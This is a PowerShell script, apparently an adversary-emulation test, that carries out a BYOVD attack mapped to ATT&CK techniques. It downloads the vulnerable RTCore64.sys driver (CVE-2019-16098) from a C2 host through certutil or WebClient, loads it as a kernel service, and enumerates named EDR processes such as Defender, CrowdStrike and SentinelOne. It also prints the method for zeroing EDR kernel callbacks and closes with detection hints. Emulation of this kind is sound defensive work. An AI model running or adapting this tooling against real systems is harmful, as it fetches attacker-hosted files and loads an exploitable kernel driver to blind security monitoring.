$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting BYOVD - RTCore64.sys EDR Bypass..." -ForegroundColor Cyan

# T1562.001 - Impair Defenses: Disable or Modify Tools
# T1068 - Exploitation for Privilege Escalation
# Uses vulnerable MSI Afterburner driver (CVE-2019-16098) for kernel-level EDR bypass

Write-Host "[*] [T1562.001] BYOVD via RTCore64.sys (CVE-2019-16098)" -ForegroundColor Yellow
Write-Host "[!] MSI Afterburner kernel driver - allows arbitrary memory R/W" -ForegroundColor Yellow
Write-Host "[!] Used by: BlackByte ransomware, Earth Longzhi APT" -ForegroundColor Yellow
Write-Host "[!] Requires: Local Administrator privileges" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
$driverDir = "C:\temp\drivers"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
New-Item -ItemType Directory -Path $driverDir -Force | Out-Null

# Step 1: Download vulnerable driver
Write-Host "`n[*] [T1105] Downloading RTCore64.sys via certutil..."
$driverPath = "$driverDir\RTCore64.sys"
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/RTCore64.sys $driverPath"
certutil -urlcache -split -f "http://$C2Host/tools/RTCore64.sys" $driverPath

if (-not (Test-Path $driverPath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/RTCore64.sys", $driverPath)
    } catch {}
}

if (Test-Path $driverPath) {
    Write-Host "[+] Driver downloaded: $driverPath" -ForegroundColor Green
    
    # Step 2: Verify driver signature
    Write-Host "`n[*] Verifying driver signature..."
    $sig = Get-AuthenticodeSignature $driverPath -ErrorAction SilentlyContinue
    Write-Host "    Signature Status: $($sig.Status)"
    Write-Host "    Signer: $($sig.SignerCertificate.Subject)"
    
    # Step 3: Load vulnerable driver via sc.exe
    Write-Host "`n[*] [T1543.003] Loading vulnerable driver..."
    $serviceName = "RTCore64"
    Write-Host "    CMD: sc create $serviceName type=kernel binPath=$driverPath"
    sc.exe create $serviceName type=kernel binPath=$driverPath 2>&1
    
    Write-Host "    CMD: sc start $serviceName"
    sc.exe start $serviceName 2>&1
    
    # Check if driver loaded
    Start-Sleep -Seconds 2
    $driverLoaded = Get-Service $serviceName -ErrorAction SilentlyContinue
    if ($driverLoaded -and $driverLoaded.Status -eq "Running") {
        Write-Host "[+] Vulnerable driver loaded successfully!" -ForegroundColor Green
    } else {
        Write-Host "[!] Driver load may have been blocked by HVCI or driver blocklist" -ForegroundColor Yellow
    }
    
    # Step 4: Enumerate security processes to target
    Write-Host "`n[*] Enumerating EDR/AV processes..." 
    $edrProcesses = @("MsMpEng", "MsSense", "SenseIR", "SenseCncProxy", "SenseNdr",
                      "CrowdStrike", "CSFalconService", "csfalconcontainer",
                      "CylanceSvc", "cb", "CbDefense",
                      "SentinelAgent", "SentinelOne",
                      "TaniumClient", "Traps", "cortex")
    
    Write-Host "    Scanning for known EDR processes..."
    foreach ($proc in $edrProcesses) {
        $found = Get-Process -Name $proc -ErrorAction SilentlyContinue
        if ($found) {
            Write-Host "    [!] FOUND: $($found.Name) (PID: $($found.Id))" -ForegroundColor Red
        }
    }
    
    # Step 5: Display exploit methodology
    Write-Host "`n[*] BYOVD exploitation methodology:" -ForegroundColor Cyan
    Write-Host "    1. Driver provides kernel R/W via IOCTL"
    Write-Host "    2. Read kernel callbacks (PsSetCreateProcessNotifyRoutine)"
    Write-Host "    3. Zero out EDR callback registrations"
    Write-Host "    4. EDR loses visibility into process creation"
    Write-Host "    5. Execute malicious payloads undetected"
    
    # Step 6: Cleanup
    Write-Host "`n[*] Cleaning up driver..."
    sc.exe stop $serviceName 2>&1
    sc.exe delete $serviceName 2>&1
    Write-Host "[+] Driver service removed" -ForegroundColor Green
    
} else {
    Write-Host "[-] Driver download failed. Ensure C2 hosts RTCore64.sys" -ForegroundColor Red
}

Write-Host "`n[+] BYOVD RTCore64 Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Vulnerable driver loading, kernel driver service creation, RTCore64.sys blocklist hit" -ForegroundColor Yellow
